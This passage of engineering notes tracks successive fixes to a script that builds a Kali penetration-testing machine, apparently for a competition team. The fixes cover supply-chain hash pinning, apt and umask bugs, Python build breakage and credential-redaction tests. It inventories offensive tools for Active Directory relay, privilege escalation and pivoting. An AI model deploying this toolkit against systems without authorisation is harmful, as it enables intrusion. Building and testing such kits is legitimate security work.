  repeatedly. **Nine more entries had the same latent shape** — one more
  `releases/latest/download` (`privesccheck`) and eight raw `master`/`main`/`refs/heads`
  files. This matters beyond tidiness: a build that cries *possible supply-chain
  compromise* on a routine upstream release teaches the team to ignore the one time it is
  real.
  All ten converted to a release tag or a full commit sha, so **zero floating `PIN_URL`
  entries remain**. The eight raw files were re-fetched from their new immutable URLs and
  hashed first: **all eight MATCHED the hash already in the manifest**, proving the content
  never changed and the references were simply aimed at a moving target. `linpeas` and
  `winpeas` are now pinned to the *same* PEASS-ng release for coherence;
  `privesccheck`'s tagged bytes were identical to its `latest`, so only the URL moved.
  **`bash pins.sh --verify` now passes on all 32 artifacts against live URLs**, including
  the new SpecterOps `sharphound_legacy` and chisel v1.12.0 entries.
  Also fixed: the summary printed `All critical tools verified!` while `linpeas` sat in the
  untrusted list, because a pin mismatch happens in the **fetch** phase and never touches
  `$FAIL`. Technically accurate, completely misleading, and the mismatch line had scrolled
  past by then. The headline is now gated on `HASH_MISMATCH` as well.
- ✅ **Closed 2026-10-05 (ninth pass): run 3 on the clean snapshot — 112 passed, 2 warnings,
  1 failed**, and the warnings were worth having. `start.sh` 3m06s, `all.sh` 31m45s, both
  exit 0, at umask 0007.
  **Proven working at last:** `[+] Burp jar verified (684704951 bytes)` — the sixth pass's
  `stat -Lc` fix, blocked in run 1 by the permission bug and in run 2 by my own deleted
  symlink. Also `[+] Burp version record (2026.3.3) verified`,
  `[+] Kali's burpsuite package removed`, `[+] pwntools verified`,
  `[+] icspacket built from source (v0.3.1)` + verified,
  `[+] kerbrute`/`windapsearch verified against pinned sha256`, `[+] gobuster verified`,
  `[+] PATH for go/pipx added to .zshrc`/`.bashrc`, and `--only-upgrade` visibly working
  (`gobuster present (upgraded if newer was available)`).
  Three new findings, all from the new named-warnings output:
  1. 🔴 **`httpx` is a NAME COLLISION and the old check verified the wrong tool.**
     `/usr/bin/httpx` belongs to **`python3-httpx`** — the Python HTTP *client library*
     CLI, unrelated to projectdiscovery's web prober beyond the name. `go_install`'s old
     `command -v httpx` guard saw it and **skipped installing the real prober entirely**,
     so the web team's `httpx` was never the prober. Worse, the pattern was `httpx`, and
     Kali's python httpx prints `Usage: httpx [OPTIONS] URL` — which *matches*. So the
     check passed, on the wrong tool, under the right name. All four Go tools are now
     checked by **absolute GOPATH path**, which removes the ambiguity entirely. The pattern
     also cannot be the tool's name: projectdiscovery renders it as **ASCII art**, so the
     literal letters never appear — matching on `Current Version|projectdiscovery` instead.
  2. 🔴 **One flaky mirror permanently lost a package.** `libreoffice-writer` failed with
     `Unable to connect to mirrors.netix.net:http: [IP: 87.121.121.4 80]`, and the
     verification then correctly reported `soffice NOT installed` — so the report-to-PDF
     path was silently gone. apt does not retry a failed fetch by default, and the same
     install succeeded by hand minutes later. `-o Acquire::Retries=3` added at every apt
     call site. Kali's mirror pool is community-run and individual mirrors flake.
  3. 🔴 **opcattack's real breakage was never cffi.** The review said
     `requirements.txt` pins `cffi==1.16.0` which cannot build on 3.14 — correct as the
     *trigger*, but the symptom is `ModuleNotFoundError: No module named 'keepalive'`:
     `keepalive-socket==0.0.1` is in the same `-r` file, and pip resolves a `-r` file as
     **one transaction**, so the unbuildable cffi pin took the whole list down. Exactly the
     pwntools failure shape. Those `==` pins are the author's 2024 dev box, not a security
     boundary, so the build now strips them and installs one name at a time. **Verified on
     the box: 11/11 deps install, `keepalive OK`, and `opcattack.py --help` prints
     `usage: opcattack.py [-h] attack ...`** — which means the narrowed `usage` pattern now
     passes honestly rather than matching its own traceback.
  Also: `go install` honours the umask, so binaries came out `-rwxrwx---` in a
  `drwxrwx---` directory — `chmod 0755` on both now, same determinism rule as everywhere
  else. The unpinned-artifact count went 19 → 20 because `httpx` is now genuinely being
  installed and honestly reported as unpinned.
- ✅ **Closed 2026-10-05 (eighth pass): a teammate's independent review of his own run,
  triaged against our two VM runs.** He re-found two bugs we had already fixed (`stat -c %s`
  on the Burp symlink; the PrivescCheck content sniff) — independent confirmation of both
  diagnoses. Of the rest:
  - 🔴 **The verification was lying in three more places, and his diagnosis of the worst
    one was incomplete.** `opcattack`'s check pattern was `usage|opcattack|error`, and the
    build printed `[!] opcattack dependencies failed - it may not run` immediately followed
    by `[+] opcattack verified`. Running it by hand gives a `Traceback`. He blamed `error`;
    the output actually matched on **`opcattack`**, which appears in the traceback's own
    file path (`/home/kali/dropzone/opcattack/opcattack.py`) — so removing only `error`
    would not have fixed it. **Rule now applied: a verification pattern must never contain
    a word that appears in a failure message or in the tool's own path.** Narrowed to
    `usage`, which argparse prints only if the script imported. `error` also dropped from
    PKINITtools and krbrelayx, where it matched every Python exception ending in `Error`.
  - 🔴 **Two check commands had gone stale and were invisible.** `gobuster version` is not
    a subcommand — it prints `No help topic for 'version'`, which contains no digits
    (`gobuster --version` → `gobuster version 3.8.2`). `evil-winrm -h` prints its banner
    **only to a TTY**, so under the build's redirection it emitted nothing. Both sat in
    `Warnings: 2` because `_run_check` classifies a pattern mismatch as a warning, and a
    count is not a diagnosis. `WARN_DETAIL[]` now names every warning in the summary.
  - 🔴 **`usermod -aG docker "$(id -un)"` gave the docker group to ROOT under sudo**, so the
    operator never got it and later hit `permission denied on /var/run/docker.sock` bringing
    up jVision — while the build had printed "User added to docker group". Now `$CPTC_USER`.
    The old comment was right that `$USER` is unsafe under `set -u` and wrong that
    `id -un` was the answer.
  - 🔴 **`terminal_uniform.sh` and `burp_logging.sh` ended their home resolver with
    `printf '%s\n' "$USER_HOME"`** — the variable the function exists to compute, so
    circular: unset (and `set -u` aborts) or empty. The other five copies always used
    `$HOME`. Only reachable standalone from outside `/home/*`, which is exactly the case
    those two scripts support.
  - 🔴 **`start.sh` installed 15 packages in one `apt-get` with `else exit 1`**, so one bad
    package took down the desktop install, the command logging and the terminal uniform —
    none of which relate to the package that failed. Now one package per call, non-fatal,
    with the existing per-tool verification deciding whether the box is usable.
  - 🔴 **Kali ships its own `burpsuite` apt package** (2026.3.2-0kali1) with its own menu
    entry. This is an **evidence** problem, not tidiness: the operator picks "Burp Suite
    Community" from the application menu, gets Kali's copy, and nothing lands in
    `~/.burp_history_readable`. `start.sh` now purges it. Found while confirming this: our
    own `burpsuite.desktop` was `0640` from the same umask bug as the jar, so our menu entry
    was the one that did not appear — now explicitly `0644`.
  - **`~/go/bin` was APPENDED to PATH**, so `/usr/bin` won and every Go binary we had just
    built was unreachable; and `go_install` guarded on `command -v`, which Kali's packaged
    `httpx`/`subfinder` satisfy, so the build skipped the install and the distro version
    won. Now prepended, persisted into both rc files, and guarded only on
    `[ -x $GOPATH/bin/$bin ]`.
  - **Newest-wins for distro packages**: `apt_install` no longer skips on `dpkg -s`; present
    packages get `--only-upgrade`. Deliberately scoped to the ~100 packages we name and
    **not** `apt full-upgrade` — that was 1389 packages on the test box and is what dragged
    Python 3.13 → 3.14 mid-build and broke pwntools and icspacket. `fetch_pinned` is
    deliberately left alone: "always newest" and a pin manifest are opposite goals.
  - **Pins:** `winpeas` 20241011 → **20261003-ea9b2e92** (upstream's latest, sha re-computed);
    `linpeas` org `carlospolop` → `peass-ng` and `sharphound_legacy`
    `BloodHoundAD` → `SpecterOps` — both old URLs still 302 today, so these are pre-emptive,
    since an org redirect dies the moment someone registers the abandoned name.
  - 🔴 **`chisel`: his advice was wrong and I did not follow it.** He said bump to v1.11.8
    and avoid v1.12.x because "those tags ship no linux binary, the URL 404s". v1.12.0
    publishes **72 linux assets**, `chisel_1.12.0_linux_amd64.gz` returns HTTP 206 at
    4,724,737 bytes, it is upstream's current release (2026-08-29), and its own notes call
    it *"a reliability and security release … hardening unauthenticated surfaces"*.
    Following the advice would have parked us one release behind the hardening one.
    **Pinned to v1.12.0.** (The specific CVE ID he cites is not independently verifiable
    from here; the version direction does not depend on it.)
  - **`icspacket`: kept our fix, not his.** He proposed
    `pipx install --python /usr/bin/python3.13` plus a standing "never run `apt autoremove`"
    warning — a fix whose own precondition is a package apt wants to delete. Building from
    the pinned tag produces a cp314 wheel and needs no 3.13 at all; run 1 proved it
    (`[+] python: icspacket built from source (v0.3.1)`), so the autoremove warning is moot.
  - **`asyncua` pinned `<2`** — this run installed 2.0.1, a major bump, and `uals`/`uaread`/
    `uawrite` have not been re-tested against it days before a freeze.
  - **`PowerUp.ps1` dropped.** PowerSploit archived 2021, no maintained fork, only ever
    pinnable to an untagged `master` — the least trustworthy artifact in the manifest.
    winPEAS and PrivescCheck cover the same ground from real releases. `powerview.ps1` from
    the same archived repo **stays**: it has no equivalent replacement.
  - **`--ismael` renamed `--mobile`**, old flag kept as a silent alias (same reasoning as
    `ad.sh`). The mobile kit stays opt-in: it was already gated, so removing it would not
    have made the default run any faster, which was the stated reason for asking.
  - **IPv6**: his `Acquire::ForceIPv4=true` is right for his box and wrong unconditionally —
    it would break an IPv6-only network, and nobody knows what the VDI provides. Now
    auto-detected: force v4 only when there is no default v6 route. The test VM has one.
  - **apt versions now recorded in `pins.lock`** (`record_apt_versions`). impacket, netexec,
    certipy, bloodhound and neo4j were absent from the box-to-box diff entirely, which
    matters more now that apt_install upgrades rather than skips.
  - **Declined:** `pip_ensure --upgrade` for pure-pip tools. It is the same unreviewed-major-
    bump risk he correctly flagged for `asyncua`, and it contradicts pinning that package.
    Left as-is deliberately.
  - **Agreed, no action:** the `chattr +i` on `qterminal.ini` stays (intentional, documented),
    and BloodHound CE lagging upstream (9.7.0~rc4 vs 9.7.1) is Kali's call, not ours.
- ✅ **Closed 2026-10-05 (seventh pass): `start.sh` → `all.sh` run end to end on the
  `clean-kali` VirtualBox snapshot**, driven by `VBoxManage guestcontrol`. Result **105
  passed / 3 warnings / 8 failed**. Two of the previous pass's fixes were confirmed
  working on a real box — `PrivescCheck.ps1 verified by pinned sha256 (946473 bytes)` and
  `python: icspacket built from source (v0.3.1)` + `icspacket … verified` — and three new
  defects came out, one of them nasty.
  1. 🔴 **`fetch_pinned` hashed sudo-downloaded files WITHOUT sudo, and reported the
     resulting empty hash as tampering.** The session umask was `0007`, so
     `$pre curl -o` wrote `/usr/local/bin/kerbrute` as `-rw-r----- root root`. The next
     line was a bare `sha256sum "$dest"`, which got `Permission denied` and an **empty**
     hash; empty ≠ the pin, so the build announced:
     `[-] kerbrute SHA256 MISMATCH - expected 710a9d2653c8bd36... got ...` /
     `[-] Do NOT use this file until you know why.`
     **The file was byte-perfect.** The script said "this artifact may have been tampered
     with" — the most alarming thing it can say — because it could not open it. And
     because `fetch_pinned` returned 1, the `&& sudo chmod +x` in the caller
     short-circuited, so `kerbrute` and `windapsearch` were also left **non-executable**.
     `verify_on_disk` already handled the empty-hash case gracefully; the fresh-download
     path did not. Now: hash with `$pre`, and an empty hash is reported as
     *"CANNOT BE HASHED … this is a permissions problem, NOT a bad download"* and is
     **kept out of `HASH_MISMATCH`**, so the end-of-run "treat these as untrusted" list
     stays truthful.
  2. 🔴 **Artifact permissions depended on the umask of whoever launched the build.**
     `curl -o` creates `0666 & ~umask`, and `sudo mkdir` likewise, so at umask 0007
     `/opt/burpsuite` came out `drwxr-x--- root root`: the **685 MB Burp jar downloaded
     perfectly** and the operator could not traverse the directory to reach it, so the
     verification pass said `Burp jar NOT found`. Same cause for
     `upshell exists but is NOT valid shell` (0750 root, unreadable). Fixed with explicit
     modes — `fetch_pinned` sets `0644`, `install_burp_latest` sets `0755` on the dir and
     `0644` on the jar and VERSION — and **all 14 `chmod +x` calls became `chmod 0755`**,
     because POSIX `+x` with no who-list *also* respects the umask (0644 → 0754 at umask
     0007), which would have reintroduced exactly the same drift.
  3. 🔴 **Five apt packages were silently lost to dpkg lock contention.**
     `E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 10042
     (apt-get)` → `apt-transport-https`, `libssl-dev`, `mc`, `seclists`, `golang` all
     `FAILED to install`, because `apt-get` gives up **instantly** by default. The
     cascade was four more failures: no `golang` → `subfinder`, `httprobe` and
     `waybackurls` never built; no `seclists` → `SecLists NOT found`. This is not a VM
     artifact — any concurrent apt wins the race, including **the second terminal this
     repo's own NEXT STEPS tells the operator to use for jVision while `all.sh` churns**.
     Fixed with `-o DPkg::Lock::Timeout=600` at all 14 apt call sites across the four
     scripts; apt then waits instead of failing. Verified the option is honoured rather
     than assumed: `apt 3.2.0` / `apt-config dump` → `DPkg::Lock::Timeout "600"`.
  4. **`pwntools` still failed, and cmake was necessary but not sufficient.** With cmake
     4.3.4 present the build got much further and then died in the compiler:
     `src/qemu/util/osdep.c:66: error: implicit declaration of function 'mprotect'` /
     `'PROT_READ' undeclared` / `gmake: *** [Makefile:146: all] Error 2`. Not OOM — no OOM
     kills in `dmesg`, 793 MB swap free. `pwntools` needs `unicorn`, there is no cp314
     wheel, so pip builds unicorn 2.1.2 from source, and its bundled QEMU code does not
     compile against **glibc 2.43 / GCC 15.2**, both now current in Kali: the newer
     headers no longer pull in `<sys/mman.h>` transitively. Unpatchable by us.
     **Kali ships `python3-pwntools 4.15.0-1`** — the same version pip wanted — depending
     on the distro-built `python3-unicorn 2.1.4`. Both scripts now take it from apt, with
     pip only as a fallback. `pkg-config` and `ninja-build` joined the toolchain
     (`pkg-config` surfaced as its own error inside the unicorn build).
  The `fetch_pinned` rewrite was unit-tested on four branches before the next run:
  fresh download at umask 0007 → **mode 644 and verifies**; the skip path verifies;
  genuinely tampered content → **still MISMATCH with both hashes**; unreadable →
  permissions message and **not** added to `HASH_MISMATCH`.
  ⚠️ **The Burp `stat -Lc` fix from the sixth pass is STILL unproven** — the jar was
  unreachable this run for reason 2, so the symlink check never got to run.
- ✅ **Closed 2026-10-05 (sixth pass): the first REAL `all.sh` run** (on a box built by the
  *old* `start.sh`). Result: **109 passed, 2 warnings, 4 failed** — and **two of the four
  failures were the verification lying about a file that was fine.** That is worse than it
  sounds: a pass that cries wolf on the single biggest download in the build teaches the
  team to ignore it.
  1. **`stat -c %s` does not follow symlinks.** GNU `stat` uses `lstat()` by default, so on
     a symlink it returns the length of the *target path string*. `check_payload` reported
     `Burp jar is only 48 bytes (expected >= 100000000)` — and 48 is exactly
     `strlen("/opt/burpsuite/burpsuite_community_v2026.3.3.jar")`, the target of the
     symlink `install_burp_latest` creates. Burp was installed, all 650 MB of it, and the
     *next* check line confirmed it runs. Now `stat -Lc %s`.
  2. **`PrivescCheck.ps1` failed a content sniff it can never pass.** itm4n's release build
     is a single packed base64 blob (`$Verbalizes = "S1mDh0YWn46..."`), so the first 2 KB
     contain neither `function` nor `param`. Its sha256 matched the pin exactly — at
     download time *and* when re-fetched and re-hashed by hand
     (`60eacd57fc869e36…`, 924 KB, ASCII). **A sha256 pin is stronger proof than any
     content sniff**, so `check_payload` now takes an optional pin name and uses the hash
     when it has one, falling back to the sniff only for unpinned files (which is the case
     the sniff was written for — an HTTP 200 that is really an error page cannot match a
     pinned hash). Wired up for `winpeas`, `pspy64`, `powerup`, `privesccheck`,
     `privesc_ps1`. Tested four ways: symlink deref, pin-passes, unpinned-still-sniffs,
     and **tampered-file-with-a-pin still FAILS loudly** — the hash path is not a rubber
     stamp.
  3. **`icspacket` genuinely could not install**, and the error message actively misleads:
     `Could not find a version that satisfies the requirement icspacket (from versions:
     none)` reads as "no such package". The package exists; it publishes **only
     cp310–cp313 C-extension wheels and no sdist**, and Kali rolling has moved to **Python
     3.14** (3.14.7 on the test box — `start.sh`'s log shows the 3.13 → 3.14 jump), so pip
     finds zero installable files. Upstream's `Python :: 3.14` classifier is aspirational.
     **Reproduced and fixed on Python 3.14.7 locally**: `all.sh` now tries the wheel, then
     builds from the pinned tag `v0.3.1`, which produces
     `icspacket-0.3.1-cp314-cp314-linux_x86_64.whl` and imports cleanly. `scikit-build-core`
     needs cmake + ninja + gcc, so `ninja-build` joins the toolchain block. The tag is
     pinned, not `master` — this is a source build of third-party code.
  4. **`pwntools` failed exactly as the fifth pass predicted**, which also exposed an
     ordering bug in that fix: `cmake` had been added to `start.sh` and to the **AD** apt
     list, but the base-runtime `pip_ensure` block runs *before* the AD section and is
     *outside* the `WANT_REST` gate — so under `--ad-only`, or on a box built by the old
     `start.sh`, `pip_ensure pwn pwntools` would still have had no `cmake`. The toolchain
     (`build-essential`, `cmake`, `ninja-build`) now installs immediately before the
     Python block, in every mode.
  The remaining preflight FAIL — *"command logging installed but NOTHING logged yet, hook
  not loaded"* — is the one item no script can fix, and the sixth-pass preflight already
  says so instead of telling the operator to re-run the installer.
  ⚠️ **Still open from this run: 19 artifacts were cloned at HEAD with no version pin**
  (`kali_wordlists jwt_tool httprobe waybackurls subfinder opcattack modbuster
  Ghostpack-CompiledBinaries SharpEfsPotato PKINITtools bloodyAD pywhisker
  targetedKerberoast krbrelayx gMSADumper KeyTabExtract certighost PowerUpSQL
  cve_2023_29360`). Two operators building on different days get different code. This is a
  `bash pins.sh --record` away and has **not** been done — it needs a build to pin *from*,
  and ideally the one that goes to the engagement.
- ✅ **Closed 2026-10-05 (fifth pass): the first REAL clean-Kali-VM run of `start.sh`.**
  Every prior pass was reviewed or dry-run; this one ran on a fresh image and the log
  showed four defects no amount of reading had caught.
  1. **`pwntools` was never installed** and neither were `requests` or `bs4`. `pwntools`
     pulls `unicorn`, which builds C extensions and died on
     `error: [Errno 2] No such file or directory: 'cmake'`. Because all four packages were
     one `pip install` command, `failed-wheel-build-for-install` aborted the *whole*
     transaction. `cmake` + `build-essential` now install in `start.sh`, and each pip
     package gets its own call. `all.sh` would not have rescued it — it only *checks*
     `check_pymod pwn` and never reinstalls.
  2. **The pip/setuptools self-upgrade was actively harmful.** Run as the operator it
     landed pip 26.2.1 and setuptools 84 in `~/.local`, shadowing Kali's own 26.1.2 / 78.1.1
     for every Python process that user starts — the log's 24-line `faradaysec ... which is
     incompatible` wall is that shadowing being announced. Removed; Kali rolling ships a
     current pip.
  3. **`argparse` was being installed from PyPI** — stdlib since 2.7, and the PyPI package
     is a 2012 backport that shadows it. Removed.
  4. **`NEXT STEPS [4]` still told the operator to run `ad.sh`** after the merge, and the
     completion banner's box border was blown open by the log path. Both fixed; the AD
     flags are documented under step [3] instead.
  Also hardened: `needrestart` is a **Recommends** of packages we install, so removing it
  once is not enough — `/etc/apt/preferences.d/99-cptc-no-needrestart` pins it to -1 so it
  cannot come back and make `all.sh` interactive. And the Python verification now **names
  the module that is missing** instead of printing "some packages may not be fully
  functional", which was the only warning the operator got.

  **The structural lesson, applied repo-wide: a box that is not ready for `all.sh` after
  `start.sh` is a SCRIPT defect, never something an operator patches by hand.** The VM
  exists to test the scripts; hand-fixing it destroys the test. Three consequences, all
  now implemented:
  1. **`all.sh` re-ensures `start.sh`'s Python runtime** (`requests`, `bs4`, `pwntools`)
     instead of only verifying it. It is `pip_ensure`, which imports first, so it costs
     three import checks on a healthy box and rescues a box whose `start.sh` pip phase
     failed for any reason.
  2. **The preflight REPAIRS instead of assigning homework.** It used to print
     `fix: bash command_logging.sh` / `fix: bash terminal_uniform.sh` — commands that live
     in this repo, are idempotent, and `all.sh` can simply run. It now runs them and
     re-checks. The only item left as a genuine FAIL is "logging installed but hook not
     loaded", which no script can fix: loading a hook into the shell that invoked `all.sh`
     is impossible, so that one really does need a fresh terminal.
  3. **Audited every check for a missing installer**, since that is the shape of the
     pwntools bug — a `check_*` with nothing behind it. Found one more: `ldap3` was
     verified by name but arrived only as a transitive dependency of bloodyAD's
     `requirements.txt`, so a failed clone produced a check with no installer. Now
     `pip_ensure ldap3` in its own right. `bs4` was the reverse (installed, never checked)
     and now has a `check_pymod`. The remaining `check_tool` names with no literal match
     — `ldapsearch`, `msfconsole`, `soffice`, `tshark`, `xfreerdp3`, `nmap` — were each
     traced to a real package whose name simply differs from the binary's
     (`ldap-utils`, `metasploit-framework`, `libreoffice-writer`, `wireshark`,
     `freerdp3-x11`, and `start.sh`'s hard-fail basic list). No gaps left.
- ✅ **Closed 2026-10-05 (fourth pass): `ad.sh` and `all.sh` are one script.** They were
  always run back to back on the same box against the same `lib.sh`, and keeping them
  apart cost a duplicated ~80-line verification helper block (now in `lib.sh`), two apt
  lists with **five packages in both** (`enum4linux`, `docker.io`, `responder`, `netexec`,
  `unzip`), two sudo keepalives, two dropzone creations, two APT-failure summaries and two
  pin summaries. Now: one apt phase, one verification pass, one summary. `--ad-only` and
  `--no-ad` gate the section, and `ad.sh` forwards to `--ad-only`.
  **A dry run with every installer stubbed caught a real regression this introduced:**
  several `cd ... || exit 1` lines inherited from `ad.sh` were harmless when that script
  ended right after them, but in the merged script they sit *before* the verification pass,
  the APT summary and the pin summary — so one interrupted clone silently took the whole
  diagnostic half of the build with it. All converted to warn-and-skip.
- ✅ **Closed 2026-10-05 (third pass).** The build no longer asks questions and no
  longer breaks under `sudo`: every `apt` call is `DEBIAN_FRONTEND=noninteractive`
  plus `--force-confdef --force-confold` (debconf was only half the problem — a dpkg
  conffile prompt stalls just as hard), `needrestart` goes in `start.sh` before the
  first big install, and the three `read` prompts are gone. **Burp moved to `all.sh`
  and now installs before its logging extension** — previously `start.sh` staged the
  extension while Burp came from `all.sh`'s apt list much later, so `burp_logging.sh`
  ran with no `UserConfig*.json` to patch and the auto-load registration silently did
  not happen; the operator got no extension and nothing said why. Burp is now
  PortSwigger's latest Community build, **and that exposed a latent break**: Burp needs
  **Java 21** (`burp/StartBurp` is class-file major 65; Java 17 dies with
  `UnsupportedClassVersionError`), which `openjdk-11-jdk` alone could never have
  provided — `default-jdk` added, and the launcher picks a JVM ≥ 21 instead of
  trusting `java`.
- ✅ **Closed 2026-10-05 (second pass) — the evidence layer was leaking credentials.**
  Testing the redactors instead of reading them found that `command_logging.sh` gates its
  `-p <password>` rule behind a tool allowlist, and **seven installed tools were missing
  from it** — `certipy`/`certipy-ad` (so all ADCS and Certighost work), `az`, `roadrecon`,
  `enum4linux`, `targetedKerberoast`, `pywhisker`, and `bloodhound-ce-python`. Their
  passwords went into the log in clear. Also leaking: the attached form `-ptoor` with no
  separator, `kerbrute passwordspray`'s positional password, and
  `aws configure set aws_secret_access_key`. Separately, `burp_logger.py` was missing a
  bare `pass` key, so `user=admin&pass=hunter2` in a POST body was logged verbatim.
  7 of 19 shell cases and 4 of 12 Burp cases leaked. All fixed, and
  **`redaction_test.sh` now exercises both redactors against one shared battery** so the
  next divergence fails a test instead of reaching the client. Also fixed: `hydra -P` was
  over-redacting the *wordlist path*, which deleted reproduction detail the report needs.
- ✅ **Closed 2026-10-05:** the repo had **no README** · **no Windows build at all**, for
  6 of the 12 provided machines · **no Windows payload set**, so every post-exploitation
  binary the previous roster carried was simply unavailable · **no coercion/relay tooling**
  (krbrelayx) · **no gMSA, MSSQL or keytab path** · **no modern pivot** (ligolo-ng) ·
  a **broken BloodHound graph path** (CE viewer, legacy-only collector) · and a
  **`pins.sh --write` that silently did nothing** · a **`fetch_pinned` that skipped the
  hash check for anything already on disk** (so pre-pin boxes stayed unverified forever,
  tampering was undetectable, and `~/pins.lock` came out incomplete — breaking the
  box-to-box diff `REHEARSAL.md` relies on) · and a **`pin_summary` that printed
  "everything verified" on the line after a hash mismatch.**
  New: **`pins.sh --audit`** re-hashes what actually landed on a box against the manifest,
  with no network, and `~/pins.lock` now records each artifact's path so it can.
